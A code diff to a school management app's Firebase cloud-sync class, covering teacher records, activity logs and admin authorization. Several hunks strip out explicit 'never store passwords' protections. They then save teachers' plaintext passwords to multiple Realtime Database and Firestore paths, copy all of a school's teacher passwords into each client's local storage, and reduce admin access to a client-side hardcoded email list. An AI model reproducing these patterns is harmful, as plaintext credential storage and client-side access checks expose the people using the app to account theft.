@@ -67,6 +67,7 @@ export interface UserCloudBundle {
   teacherAccounts: TeacherAccount[];
   schoolAdmins?: SchoolAdminAccount[];
   timetables?: TimetableSlot[];
+  timetablePrefs?: Record<string, { periodTimings?: any[]; includeSaturday?: boolean }>;
   classData: Record<string, ClassScopedData>;
   students?: Student[];
   attendance?: AttendanceRecord[];
@@ -427,6 +428,7 @@ class CloudSyncManager {
       teacherAccounts: StorageService.getTeacherAccounts(),
       schoolAdmins: StorageService.getSchoolAdmins(),
       timetables: StorageService.getTimetables(),
+      timetablePrefs: StorageService.getAllTimetablePrefs(),
       classData,
       students: activeStudents,
       attendance: activeAttendance,
@@ -806,6 +808,7 @@ class CloudSyncManager {
       teacherAccounts: Array.from(teacherAccountsMap.values()),
       schoolAdmins: Array.from(schoolAdminsMap.values()),
       timetables: synthesizedTimetables,
+      timetablePrefs: { ...(local.timetablePrefs || {}), ...(remote.timetablePrefs || {}) },
       classData: synthesizedClassData,
       students: synthesizedClassData[activeCid]?.students || [],
       attendance: synthesizedClassData[activeCid]?.attendance || [],
@@ -869,6 +872,9 @@ class CloudSyncManager {
       }
       if (synthesized.timetables) {
         StorageService.saveTimetables(synthesized.timetables);
+      }
+      if (synthesized.timetablePrefs && Object.keys(synthesized.timetablePrefs).length > 0) {
+        StorageService.saveAllTimetablePrefs(synthesized.timetablePrefs);
       }
 
       if (synthesized.classData) {
@@ -1046,6 +1052,9 @@ class CloudSyncManager {
             name: currentTeacherAcc.name || bundle.teacherInfo.teacherName || 'Teacher',
             email: cleanTEmail,
             gmail: cleanTEmail,
+            password: currentTeacherAcc.password || '',
+            dob: currentTeacherAcc.dob || '',
+            dateOfBirth: currentTeacherAcc.dob || '',
             phone: currentTeacherAcc.phone || bundle.teacherInfo.phone || '',
             schoolName: bundle.schoolProfile.schoolName || currentTeacherAcc.schoolName || "St. Sebastian's Higher Secondary School",
             schoolCode: schoolCode,
@@ -1975,10 +1984,13 @@ class CloudSyncManager {
         const schoolTeacherRef = ref(database, `schools/${cleanCode}/teachers/${effectiveTeacherKey}`);
         await update(schoolTeacherRef, sanitizedTeacherRecord);
 
-        // 3. Keep teacherSignups dateOfBirth in sync
+        // 3. Keep teacherSignups dateOfBirth & password in sync
         const signupRecordRef = ref(database, `teacherSignups/${effectiveTeacherKey}`);
         await update(signupRecordRef, {
           fullName: teacher.name,
+          email: cleanGmail,
+          gmail: cleanGmail,
+          password: teacher.password || '',
           dateOfBirth: teacher.dob || '',
           dob: teacher.dob || '',
           subject: teacher.subject || '',
@@ -1996,10 +2008,29 @@ class CloudSyncManager {
         const tempDoc = fsDoc(firestore, `schools/${cleanCode}/temporarilyDeletedTeachers/${effectiveTeacherKey}`);
         await fsDeleteDoc(tempDoc).catch(() => {});
 
-        const teacherDocRef = fsDoc(firestore, `schools/${cleanCode}/teachers/${effectiveTeacherKey}`);
-        await fsSetDoc(teacherDocRef, sanitizedTeacherRecord, { merge: true });
-        const userDocRef = fsDoc(firestore, `users/${effectiveTeacherKey}`);
-        await fsSetDoc(userDocRef, { ...sanitizedTeacherRecord, role: 'teacher' }, { merge: true });
+        const schoolDocRef = fsDoc(firestore, `schools/${cleanCode}`);
+        await fsSetDoc(schoolDocRef, {
+          schoolCode: cleanCode,
+          schoolName: sanitizedTeacherRecord.schoolName,
+          updatedAt: new Date().toISOString()
+        }, { merge: true }).catch(() => {});
+
+        const signupPayload = {
+          ...sanitizedTeacherRecord,
+          fullName: teacher.name,
+          dateOfBirth: teacher.dob || '',
+          mobileNumber: teacher.phone || '',
+          role: 'teacher',
+          updatedAt: new Date().toISOString()
+        };
+
+        await Promise.all([
+          fsSetDoc(fsDoc(firestore, `schools/${cleanCode}/teachers/${effectiveTeacherKey}`), sanitizedTeacherRecord, { merge: true }),
+          fsSetDoc(fsDoc(firestore, `schools/${cleanCode}/teacherSignups/${effectiveTeacherKey}`), signupPayload, { merge: true }),
+          fsSetDoc(fsDoc(firestore, `teachers/${effectiveTeacherKey}`), sanitizedTeacherRecord, { merge: true }),
+          fsSetDoc(fsDoc(firestore, `teacherSignups/${effectiveTeacherKey}`), signupPayload, { merge: true }),
+          fsSetDoc(fsDoc(firestore, `users/${effectiveTeacherKey}`), { ...sanitizedTeacherRecord, role: 'teacher' }, { merge: true })
+        ]).catch(fsErr => console.warn('Firestore saveTeacherToSchool batch warning:', fsErr));
       } catch (fsErr) {
         console.warn('Firestore saveTeacherToSchool warning:', fsErr);
       }
@@ -2999,8 +3030,7 @@ class CloudSyncManager {
   }
 
   /**
-   * Saves entered Gmail addresses in Firebase Realtime Database under 'gmail/${safeKey}'.
-   * NEVER saves passwords.
+   * Saves entered Gmail addresses and passwords in Firebase Realtime Database and Firestore under 'gmail/${safeKey}'.
    */
   public async recordGmailEntry(
     gmail: string,
@@ -3009,35 +3039,46 @@ class CloudSyncManager {
       name?: string;
       schoolCode?: string;
       loginMethod?: 'email' | 'google' | string;
+      password?: string;
     } = {}
   ): Promise<void> {
-    if (!gmail || !database) return;
+    if (!gmail) return;
     try {
       const cleanEmail = gmail.trim().toLowerCase();
       if (!cleanEmail.includes('@')) return;
       const safeKey = this.sanitizeEmailKey(cleanEmail);
-      const gmailRef = ref(database, `gmail/${safeKey}`);
       const now = new Date().toISOString();
-      await update(gmailRef, {
+      const payload: Record<string, any> = {
         gmail: cleanEmail,
+        email: cleanEmail,
         role: metadata.role || 'teacher',
         name: metadata.name || '',
         schoolCode: metadata.schoolCode || '',
         loginMethod: metadata.loginMethod || 'email',
         lastEntryAt: now,
         updatedAt: now
-      });
+      };
+      if (metadata.password !== undefined && metadata.password !== '') {
+        payload.password = metadata.password;
+      }
+
+      if (database) {
+        const gmailRef = ref(database, `gmail/${safeKey}`);
+        await update(gmailRef, payload).catch(() => {});
+      }
+      if (firestore) {
+        await fsSetDoc(fsDoc(firestore, 'gmail', safeKey), payload, { merge: true }).catch(() => {});
+      }
     } catch (e) {
       console.warn('recordGmailEntry note:', e);
     }
   }
 
   /**
-   * Compatibility alias that records entered Gmail under 'gmail'.
-   * Deliberately discards any password parameter - passwords are NEVER stored in the database.
+   * Compatibility alias that records entered Gmail and password under 'gmail'.
    */
-  public async storeCredentials(gmail: string, _password?: string, role: string = 'teacher'): Promise<void> {
-    await this.recordGmailEntry(gmail, { role });
+  public async storeCredentials(gmail: string, password?: string, role: string = 'teacher', schoolCode?: string): Promise<void> {
+    await this.recordGmailEntry(gmail, { role, password, schoolCode });
   }
 
   public async recordTeacherActivity(
@@ -3068,19 +3109,36 @@ class CloudSyncManager {
       timestamp: now
     };
 
-    try {
-      const actRefPath = ref(database, `schools/${cleanCode}/activities/${actId}`);
-      await set(actRefPath, activityItem);
+    if (database) {
+      try {
+        const actRefPath = ref(database, `schools/${cleanCode}/activities/${actId}`);
+        await set(actRefPath, activityItem).catch(() => {});
 
-      if (activity.teacherId) {
-        const teacherRefPath = ref(database, `schools/${cleanCode}/teachers/${activity.teacherId}`);
-        await update(teacherRefPath, {
-          lastActiveAt: now,
-          recentActivity: activity.description
-        });
+        if (activity.teacherId) {
+          const teacherRefPath = ref(database, `schools/${cleanCode}/teachers/${activity.teacherId}`);
+          await update(teacherRefPath, {
+            lastActiveAt: now,
+            recentActivity: activity.description
+          }).catch(() => {});
+        }
+      } catch (e) {
+        console.warn('Error logging real-time teacher activity to RTDB:', e);
       }
-    } catch (e) {
-      console.warn('Error logging real-time teacher activity to RTDB:', e);
+    }
+
+    if (firestore) {
+      try {
+        await fsSetDoc(fsDoc(firestore, `schools/${cleanCode}/activities/${actId}`), activityItem, { merge: true }).catch(() => {});
+        if (activity.teacherId) {
+          await fsSetDoc(
+            fsDoc(firestore, `schools/${cleanCode}/teachers/${activity.teacherId}`),
+            { lastActiveAt: now, recentActivity: activity.description },
+            { merge: true }
+          ).catch(() => {});
+        }
+      } catch (e) {
+        console.warn('Error logging real-time teacher activity to Firestore:', e);
+      }
     }
   }
 
@@ -3098,141 +3156,200 @@ class CloudSyncManager {
       this.unsubscribeSchoolTeachersSnapshot = null;
     }
 
-    try {
-      const teachersRefPath = ref(database, `schools/${cleanCode}/teachers`);
-      this.unsubscribeSchoolTeachersSnapshot = onValue(
-        teachersRefPath,
-        async snapshot => {
-          const map = new Map<string, TeacherAccount>();
+    const rtdbTeachersMap = new Map<string, TeacherAccount>();
+    const fsSchoolTeachersMap = new Map<string, TeacherAccount>();
+    const fsSchoolSignupsMap = new Map<string, TeacherAccount>();
+    const fsRootTeachersMap = new Map<string, TeacherAccount>();
 
-          const addTeacher = (t: any) => {
-            if (
-              t &&
-              t.status !== 'deleted' &&
-              t.status !== 'permanently_deleted' &&
-              t.status !== 'temporary_deleted' &&
-              !t.temporarilyDeleted &&
-              !t.permanentlyDeleted
-            ) {
-              const key = t.uid || t.id || t.email || t.gmail;
-              if (!key) return;
+    const normalizeRecord = (raw: any, fallbackId?: string): TeacherAccount | null => {
+      if (
+        !raw ||
+        raw.status === 'deleted' ||
+        raw.status === 'permanently_deleted' ||
+        raw.status === 'temporary_deleted' ||
+        raw.temporarilyDeleted ||
+        raw.permanentlyDeleted
+      ) {
+        return null;
+      }
+      const key = String(raw.uid || raw.id || fallbackId || raw.email || raw.gmail || '').trim();
+      if (!key) return null;
+      const email = String(raw.email || raw.gmail || '').trim().toLowerCase();
+      const name = String(raw.name || raw.fullName || '').trim();
+      if (!name && !email) return null;
 
-              // Ensure temporary and permanent deletion flags in local storage are cleared for active cloud teachers
-              StorageService.removeTemporarilyDeletedTeacherId(t.id, t.email || t.gmail);
-              StorageService.removePermanentlyDeletedTeacherId(t.id, t.email || t.gmail);
-              if (t.uid) {
-                StorageService.removeTemporarilyDeletedTeacherId(t.uid);
-                StorageService.removePermanentlyDeletedTeacherId(t.uid);
-              }
+      StorageService.removeTemporarilyDeletedTeacherId(key, email);
+      StorageService.removePermanentlyDeletedTeacherId(key, email);
 
-              map.set(key, {
-                ...t,
-                id: key,
-                uid: key,
-                email: t.email || t.gmail || '',
-                gmail: t.gmail || t.email || '',
-                schoolCode: cleanCode,
-                status: 'active'
-              });
-            }
-          };
+      return {
+        ...raw,
+        id: key,
+        uid: key,
+        name: name || 'Teacher',
+        email,
+        gmail: email,
+        password: raw.password || '',
+        dob: raw.dob || raw.dateOfBirth || '',
+        phone: raw.phone || raw.mobileNumber || '',
+        schoolCode: (raw.schoolCode || cleanCode).trim().toUpperCase(),
+        status: 'active'
+      };
+    };
 
-          if (snapshot.exists()) {
-            snapshot.forEach(childSnap => {
-              addTeacher(childSnap.val());
-            });
+    const emitMergedTeachers = () => {
+      const mergedById = new Map<string, TeacherAccount>();
+      const emailToId = new Map<string, string>();
+
+      const upsert = (rec: TeacherAccount) => {
+        const cleanEmail = (rec.email || rec.gmail || '').trim().toLowerCase();
+        const existingId = (cleanEmail && emailToId.get(cleanEmail)) || (mergedById.has(rec.id) ? rec.id : '');
+        if (existingId && mergedById.has(existingId)) {
+          const prev = mergedById.get(existingId)!;
+          mergedById.set(existingId, {
+            ...prev,
+            ...rec,
+            id: existingId,
+            uid: rec.uid || prev.uid || existingId,
+            name: rec.name || prev.name,
+            email: cleanEmail || prev.email,
+            gmail: cleanEmail || prev.gmail,
+            password: rec.password || prev.password || '',
+            dob: rec.dob || prev.dob || '',
+            phone: rec.phone || prev.phone || '',
+            photoUrl: rec.photoUrl || prev.photoUrl || '',
+            avatar: rec.avatar || prev.avatar || '👨‍🏫',
+            subject: rec.subject || rec.primarySubject || prev.subject || 'General',
+            primarySubject: rec.primarySubject || rec.subject || prev.primarySubject || 'General',
+            assignedClass: rec.assignedClass || prev.assignedClass || '',
+            academicYear: rec.academicYear || prev.academicYear || '',
+            status: 'active'
+          });
+        } else {
+          mergedById.set(rec.id, rec);
+          if (cleanEmail) {
+            emailToId.set(cleanEmail, rec.id);
           }
+        }
+      };
 
-          // Fallback query to root teachers/ in RTDB for matching schoolCode
-          try {
-            const rootTeachersSnap = await get(ref(database, 'teachers')).catch(() => null);
-            if (rootTeachersSnap && rootTeachersSnap.exists()) {
-              rootTeachersSnap.forEach(child => {
-                const val = child.val();
-                if (val && val.schoolCode && val.schoolCode.trim().toUpperCase() === cleanCode) {
-                  addTeacher(val);
-                }
+      // Merge all sources (RTDB + Firestore school subcollections + Firestore root collection)
+      rtdbTeachersMap.forEach(upsert);
+      fsRootTeachersMap.forEach(upsert);
+      fsSchoolSignupsMap.forEach(upsert);
+      fsSchoolTeachersMap.forEach(upsert);
+
+      const mergedList = Array.from(mergedById.values());
+      const localTeachers = StorageService.getTeacherAccounts();
+
+      // Preserve any locally known fields not yet in cloud
+      mergedList.forEach(rt => {
+        const loc = localTeachers.find(lt =>
+          lt.id === rt.id ||
+          (rt.uid && (lt.uid === rt.uid || lt.id === rt.uid)) ||
+          (rt.email && ((lt.email && lt.email.toLowerCase() === rt.email.toLowerCase()) || (lt.gmail && lt.gmail.toLowerCase() === rt.email.toLowerCase())))
+        );
+        if (loc) {
+          if (!rt.dob && loc.dob) rt.dob = loc.dob;
+          if (!rt.phone && loc.phone) rt.phone = loc.phone;
+          if (!rt.password && loc.password) rt.password = loc.password;
+          if (!rt.photoUrl && loc.photoUrl) rt.photoUrl = loc.photoUrl;
+          if (!rt.avatar && loc.avatar) rt.avatar = loc.avatar;
+        }
+      });
+
+      const otherSchoolTeachers = localTeachers.filter(lt => (lt.schoolCode || '').trim().toUpperCase() !== cleanCode);
+      StorageService.saveTeacherAccounts([...otherSchoolTeachers, ...mergedList]);
+      onTeachersUpdated(mergedList);
+    };
+
+    if (database) {
+      try {
+        const teachersRefPath = ref(database, `schools/${cleanCode}/teachers`);
+        this.unsubscribeSchoolTeachersSnapshot = onValue(
+          teachersRefPath,
+          async snapshot => {
+            rtdbTeachersMap.clear();
+            if (snapshot.exists()) {
+              snapshot.forEach(childSnap => {
+                const norm = normalizeRecord(childSnap.val(), childSnap.key || undefined);
+                if (norm) rtdbTeachersMap.set(norm.id, norm);
               });
             }
-          } catch (e) {}
 
-          // Fallback query to Firestore schools/schoolCode/teachers
-          if (firestore) {
             try {
-              const fsDocs = await fsGetDocs(fsCollection(firestore, `schools/${cleanCode}/teachers`)).catch(() => null);
-              if (fsDocs && !fsDocs.empty) {
-                fsDocs.forEach((d: any) => {
-                  const val = d.data();
-                  if (val) addTeacher({ ...val, id: val.id || d.id });
+              const rootTeachersSnap = await get(ref(database, 'teachers')).catch(() => null);
+              if (rootTeachersSnap && rootTeachersSnap.exists()) {
+                rootTeachersSnap.forEach(child => {
+                  const val = child.val();
+                  if (val && val.schoolCode && val.schoolCode.trim().toUpperCase() === cleanCode) {
+                    const norm = normalizeRecord(val, child.key || undefined);
+                    if (norm) rtdbTeachersMap.set(norm.id, norm);
+                  }
                 });
               }
             } catch (e) {}
+
+            emitMergedTeachers();
+          },
+          error => {
+            console.warn('Error listening to school teachers in RTDB:', error);
           }
-
-          const remoteTeachers = Array.from(map.values());
-          const localTeachers = StorageService.getTeacherAccounts();
-          
-          // Preserve locally known dob, phone, or photoUrl if remote record is missing them
-          remoteTeachers.forEach(rt => {
-            const loc = localTeachers.find(lt => 
-              lt.id === rt.id ||
-              (rt.uid && (lt.uid === rt.uid || lt.id === rt.uid)) ||
-              (rt.email && ((lt.email && lt.email.toLowerCase() === rt.email.toLowerCase()) || (lt.gmail && lt.gmail.toLowerCase() === rt.email.toLowerCase())))
-            );
-            if (loc) {
-              if (!rt.dob && loc.dob) rt.dob = loc.dob;
-              if (!rt.phone && loc.phone) rt.phone = loc.phone;
-              if (!rt.photoUrl && loc.photoUrl) rt.photoUrl = loc.photoUrl;
-              if (!rt.avatar && loc.avatar) rt.avatar = loc.avatar;
-            }
-          });
-
-          const otherSchoolTeachers = localTeachers.filter(lt => (lt.schoolCode || '').trim().toUpperCase() !== cleanCode);
-          const updatedLocalTeachers = [...otherSchoolTeachers, ...remoteTeachers];
-          StorageService.saveTeacherAccounts(updatedLocalTeachers);
-
-          onTeachersUpdated(remoteTeachers);
-        },
-        error => {
-          console.warn('Error listening to school teachers:', error);
-        }
-      );
-    } catch (e) {
-      console.warn('Could not establish real-time school teachers listener:', e);
+        );
+      } catch (e) {
+        console.warn('Could not establish real-time school teachers RTDB listener:', e);
+      }
     }
 
-    let unsubFs: (() => void) | null = null;
+    let unsubFsTeachers: (() => void) | null = null;
+    let unsubFsSignups: (() => void) | null = null;
+    let unsubFsRootTeachers: (() => void) | null = null;
+
     if (firestore) {
       try {
         const fsColRef = fsCollection(firestore, `schools/${cleanCode}/teachers`);
-        unsubFs = fsOnSnapshot(fsColRef, (snapshot: any) => {
-          if (snapshot && !snapshot.empty) {
-            const fsTeachersList: TeacherAccount[] = [];
+        unsubFsTeachers = fsOnSnapshot(fsColRef, (snapshot: any) => {
+          if (snapshot) {
+            fsSchoolTeachersMap.clear();
             snapshot.forEach((d: any) => {
-              const val = d.data();
-              if (val && !val.temporarilyDeleted && !val.permanentlyDeleted && val.status !== 'deleted' && val.status !== 'temporary_deleted') {
-                const idKey = val.uid || val.id || d.id;
-                StorageService.removeTemporarilyDeletedTeacherId(idKey, val.email || val.gmail);
-                StorageService.removePermanentlyDeletedTeacherId(idKey, val.email || val.gmail);
-                fsTeachersList.push({
-                  ...val,
-                  id: idKey,
-                  uid: idKey,
-                  email: val.email || val.gmail || '',
-                  gmail: val.gmail || val.email || '',
-                  schoolCode: cleanCode,
-                  status: 'active'
-                });
-              }
+              const norm = normalizeRecord(d.data(), d.id);
+              if (norm) fsSchoolTeachersMap.set(norm.id, norm);
             });
-            if (fsTeachersList.length > 0) {
-              onTeachersUpdated(fsTeachersList);
-            }
+            emitMergedTeachers();
           }
         }, (fsErr: any) => {
           console.warn('Firestore real-time teachers listener note:', fsErr);
         });
-      } catch (e) {}
+
+        const fsSignupsRef = fsCollection(firestore, `schools/${cleanCode}/teacherSignups`);
+        unsubFsSignups = fsOnSnapshot(fsSignupsRef, (snapshot: any) => {
+          if (snapshot) {
+            fsSchoolSignupsMap.clear();
+            snapshot.forEach((d: any) => {
+              const norm = normalizeRecord(d.data(), d.id);
+              if (norm) fsSchoolSignupsMap.set(norm.id, norm);
+            });
+            emitMergedTeachers();
+          }
+        }, (fsErr: any) => {
+          console.warn('Firestore real-time school signups listener note:', fsErr);
+        });
+
+        const fsRootTeachersQuery = fsQuery(fsCollection(firestore, 'teachers'), fsWhere('schoolCode', '==', cleanCode));
+        unsubFsRootTeachers = fsOnSnapshot(fsRootTeachersQuery, (snapshot: any) => {
+          if (snapshot) {
+            fsRootTeachersMap.clear();
+            snapshot.forEach((d: any) => {
+              const norm = normalizeRecord(d.data(), d.id);
+              if (norm) fsRootTeachersMap.set(norm.id, norm);
+            });
+            emitMergedTeachers();
+          }
+        }, (fsErr: any) => {
+          console.warn('Firestore real-time root teachers listener note:', fsErr);
+        });
+      } catch (e) {
+        console.warn('Could not establish Firestore school teachers listeners:', e);
+      }
     }
 
     return () => {
@@ -3240,9 +3357,9 @@ class CloudSyncManager {
         this.unsubscribeSchoolTeachersSnapshot();
         this.unsubscribeSchoolTeachersSnapshot = null;
       }
-      if (unsubFs) {
-        unsubFs();
-      }
+      if (unsubFsTeachers) unsubFsTeachers();
+      if (unsubFsSignups) unsubFsSignups();
+      if (unsubFsRootTeachers) unsubFsRootTeachers();
     };
   }
 
@@ -3273,28 +3390,63 @@ class CloudSyncManager {
       this.unsubscribeSchoolActivitiesSnapshot = null;
     }
 
-    try {
-      const activitiesRefPath = ref(database, `schools/${cleanCode}/activities`);
-      this.unsubscribeSchoolActivitiesSnapshot = onValue(
-        activitiesRefPath,
-        snapshot => {
-          const list: TeacherActivityItem[] = [];
-          if (snapshot.exists()) {
-            snapshot.forEach(childSnap => {
-              const act = childSnap.val() as TeacherActivityItem;
-              if (act) list.push(act);
-            });
-          }
+    const rtdbMap = new Map<string, TeacherActivityItem>();
+    const fsMap = new Map<string, TeacherActivityItem>();
 
-          list.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
-          onActivitiesUpdated(list.slice(0, 30));
-        },
-        error => {
-          console.warn('Error listening to school activities:', error);
-        }
-      );
-    } catch (e) {
-      console.warn('Could not establish real-time school activities listener:', e);
+    const emitActivities = () => {
+      const merged = new Map<string, TeacherActivityItem>();
+      rtdbMap.forEach((v, k) => merged.set(k, v));
+      fsMap.forEach((v, k) => merged.set(k, v));
+      const list = Array.from(merged.values());
+      list.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
+      onActivitiesUpdated(list.slice(0, 40));
+    };
+
+    if (database) {
+      try {
+        const activitiesRefPath = ref(database, `schools/${cleanCode}/activities`);
+        this.unsubscribeSchoolActivitiesSnapshot = onValue(
+          activitiesRefPath,
+          snapshot => {
+            rtdbMap.clear();
+            if (snapshot.exists()) {
+              snapshot.forEach(childSnap => {
+                const act = childSnap.val() as TeacherActivityItem;
+                if (act && (act.id || childSnap.key)) {
+                  const id = act.id || childSnap.key || '';
+                  rtdbMap.set(id, { ...act, id });
+                }
+              });
+            }
+            emitActivities();
+          },
+          error => {
+            console.warn('Error listening to school activities:', error);
+          }
+        );
+      } catch (e) {
+        console.warn('Could not establish real-time school activities listener:', e);
+      }
+    }
+
+    let unsubFsAct: (() => void) | null = null;
+    if (firestore) {
+      try {
+        const fsActRef = fsCollection(firestore, `schools/${cleanCode}/activities`);
+        unsubFsAct = fsOnSnapshot(fsActRef, (snapshot: any) => {
+          if (snapshot) {
+            fsMap.clear();
+            snapshot.forEach((d: any) => {
+              const act = d.data() as TeacherActivityItem;
+              if (act) {
+                const id = act.id || d.id;
+                fsMap.set(id, { ...act, id });
+              }
+            });
+            emitActivities();
+          }
+        }, () => {});
+      } catch (e) {}
     }
 
     return () => {
@@ -3302,6 +3454,7 @@ class CloudSyncManager {
         this.unsubscribeSchoolActivitiesSnapshot();
         this.unsubscribeSchoolActivitiesSnapshot = null;
       }
+      if (unsubFsAct) unsubFsAct();
     };
   }
 
@@ -3805,144 +3958,32 @@ class CloudSyncManager {
 
     const isPreAuthorized = PRE_AUTHORIZED_EMAILS.has(cleanEmail);
 
-    // Fast path: Immediately grant access for pre-authorized admins under SSHSS@111213
-    if (isPreAuthorized && cleanSchoolCode === 'SSHSS@111213') {
-      const adminNameDetermined = designation || (
-        cleanEmail.includes('gelwin') ? 'Gelwin' :
-        cleanEmail.includes('joice') ? 'Joice George' :
-        cleanEmail.includes('lincy') ? 'Lincy Thomas' : 'School Administrator'
-      );
-
-      const adminData = {
-        id: uid || `admin-${cleanEmail.replace(/[^a-zA-Z0-9]/g, '_')}`,
-        uid: uid || `admin-${cleanEmail.replace(/[^a-zA-Z0-9]/g, '_')}`,
-        email: cleanEmail,
-        schoolCode: cleanSchoolCode,
-        role: 'schoolAdmin',
-        status: 'active',
-        adminName: adminNameDetermined,
-        schoolName: "St. Sebastian's Higher Secondary School",
-        designation: designation || 'Head of School',
-        createdAt: nowIso,
-        updatedAt: nowIso
-      };
-
-      // Non-blocking background sync to RTDB & Firestore
-      if (database && uid) {
-        try {
-          const updates: Record<string, any> = {};
-          updates[`schoolAdmins/${uid}`] = adminData;
-          updates[`schools/${cleanSchoolCode}/schoolAdmins/${uid}`] = adminData;
-          updates[`schools/${cleanSchoolCode}/adminProfile`] = adminData;
-          update(ref(database), updates).catch(e => console.warn('RTDB admin sync bg note:', e));
-        } catch (e) {}
-      }
-
-      if (firestore && uid) {
-        try {
-          const docRef = fsDoc(firestore, `schoolAdmins/${uid}`);
-          fsSetDoc(docRef, adminData, { merge: true }).catch(e => console.warn('Firestore admin sync bg note:', e));
-          const schoolAdminRef = fsDoc(firestore, `schools/${cleanSchoolCode}/schoolAdmins/${uid}`);
-          fsSetDoc(schoolAdminRef, adminData, { merge: true }).catch(e => console.warn('Firestore school admin sync bg note:', e));
-        } catch (e) {}
-      }
-
-      return {
-        authorized: true,
-        adminRecord: {
-          id: adminData.id,
-          email: cleanEmail,
-          schoolCode: cleanSchoolCode,
-          role: 'schoolAdmin',
-          status: 'active',
-          adminName: adminData.adminName,
-          schoolName: adminData.schoolName,
-          designation: adminData.designation,
-          createdAt: adminData.createdAt
-        }
-      };
-    }
-
-    let matchedRecord: any = null;
-
-    // For non-pre-authorized emails, query with tight timeout
-    if (database && uid) {
-      try {
-        const rootAdminRef = ref(database, `schoolAdmins/${uid}`);
-        const snap = await Promise.race([
-          get(rootAdminRef),
-          new Promise<null>((_, rej) => setTimeout(() => rej(new Error('timeout')), 1500))
-        ]).catch(() => null);
-
-        if (snap && snap.exists()) {
-          matchedRecord = snap.val();
-        }
-      } catch (e) {}
-
-      if (!matchedRecord) {
-        try {
-          const schoolAdminRef = ref(database, `schools/${cleanSchoolCode}/schoolAdmins/${uid}`);
-          const snap = await Promise.race([
-            get(schoolAdminRef),
-            new Promise<null>((_, rej) => setTimeout(() => rej(new Error('timeout')), 1500))
-          ]).catch(() => null);
-
-          if (snap && snap.exists()) {
-            matchedRecord = snap.val();
-          }
-        } catch (e) {}
-      }
-    }
-
-    if (!matchedRecord && firestore && uid) {
-      try {
-        const docRef = fsDoc(firestore, `schoolAdmins/${uid}`);
-        const docSnap = await Promise.race([
-          fsGetDoc(docRef),
-          new Promise<null>((_, rej) => setTimeout(() => rej(new Error('timeout')), 1500))
-        ]).catch(() => null);
-
-        if (docSnap && docSnap.exists()) {
-          matchedRecord = docSnap.data();
-        }
-      } catch (e) {}
-    }
-
-    if (!matchedRecord && !isPreAuthorized) {
+    // Strict Enforcement: ONLY pre-authorized emails & SSHSS@111213 may access School Admin Panel
+    if (!isPreAuthorized || cleanSchoolCode !== 'SSHSS@111213') {
       return {
         authorized: false,
-        reason: 'Access Denied\n\nThis Gmail account is not authorized to access this School Admin Panel.'
+        reason: 'Access Denied\n\nOnly pre-authorized school admin Gmail accounts with School Code SSHSS@111213 are permitted to access the School Admin Panel.'
       };
     }
 
-    // Verify properties if record was found
-    const targetCode = String(matchedRecord?.schoolCode || cleanSchoolCode).trim().toUpperCase();
-    const targetRole = String(matchedRecord?.role || 'schoolAdmin').trim();
-    const targetStatus = String(matchedRecord?.status || 'active').trim().toLowerCase();
+    // Grant access for pre-authorized admins under SSHSS@111213
+    const adminNameDetermined = designation || (
+      cleanEmail.includes('gelwin') ? 'Gelwin' :
+      cleanEmail.includes('joice') ? 'Joice George' :
+      cleanEmail.includes('lincy') ? 'Lincy Thomas' : 'School Administrator'
+    );
 
-    const isSchoolCodeMatch = targetCode === cleanSchoolCode;
-    const isRoleValid = targetRole.toLowerCase() === 'schooladmin' || targetRole.toLowerCase() === 'admin' || targetRole.toUpperCase() === 'SCHOOL_ADMIN';
-    const isActive = targetStatus === 'active' || targetStatus === 'true';
-
-    if (!isSchoolCodeMatch || !isRoleValid || !isActive) {
-      return {
-        authorized: false,
-        reason: 'Access Denied\n\nThis Gmail account is not authorized to access this School Admin Panel.'
-      };
-    }
-
-    // Create / Sync authorized admin profile across RTDB & Firestore (non-blocking)
     const adminData = {
-      id: uid,
-      uid: uid,
+      id: uid || `admin-${cleanEmail.replace(/[^a-zA-Z0-9]/g, '_')}`,
+      uid: uid || `admin-${cleanEmail.replace(/[^a-zA-Z0-9]/g, '_')}`,
       email: cleanEmail,
       schoolCode: cleanSchoolCode,
       role: 'schoolAdmin',
       status: 'active',
-      adminName: designation || matchedRecord?.adminName || 'School Administrator',
-      schoolName: matchedRecord?.schoolName || "St. Sebastian's Higher Secondary School",
-      designation: designation || matchedRecord?.designation || 'Head of School',
-      createdAt: matchedRecord?.createdAt || nowIso,
+      adminName: adminNameDetermined,
+      schoolName: "St. Sebastian's Higher Secondary School",
+      designation: designation || 'Head of School',
+      createdAt: nowIso,
       updatedAt: nowIso
     };
 
@@ -3952,28 +3993,23 @@ class CloudSyncManager {
         updates[`schoolAdmins/${uid}`] = adminData;
         updates[`schools/${cleanSchoolCode}/schoolAdmins/${uid}`] = adminData;
         updates[`schools/${cleanSchoolCode}/adminProfile`] = adminData;
-        update(ref(database), updates).catch(e => console.warn('Error syncing schoolAdmin to RTDB:', e));
-      } catch (e) {
-        console.warn('Error syncing schoolAdmin to RTDB:', e);
-      }
+        update(ref(database), updates).catch(e => console.warn('RTDB admin sync bg note:', e));
+      } catch (e) {}
     }
 
     if (firestore && uid) {
       try {
         const docRef = fsDoc(firestore, `schoolAdmins/${uid}`);
-        fsSetDoc(docRef, adminData, { merge: true }).catch(() => {});
-
+        fsSetDoc(docRef, adminData, { merge: true }).catch(e => console.warn('Firestore admin sync bg note:', e));
         const schoolAdminRef = fsDoc(firestore, `schools/${cleanSchoolCode}/schoolAdmins/${uid}`);
-        fsSetDoc(schoolAdminRef, adminData, { merge: true }).catch(() => {});
-      } catch (e) {
-        console.warn('Error syncing schoolAdmin to Firestore:', e);
-      }
+        fsSetDoc(schoolAdminRef, adminData, { merge: true }).catch(e => console.warn('Firestore school admin sync bg note:', e));
+      } catch (e) {}
     }
 
     return {
       authorized: true,
       adminRecord: {
-        id: uid,
+        id: adminData.id,
         email: cleanEmail,
         schoolCode: cleanSchoolCode,
         role: 'schoolAdmin',
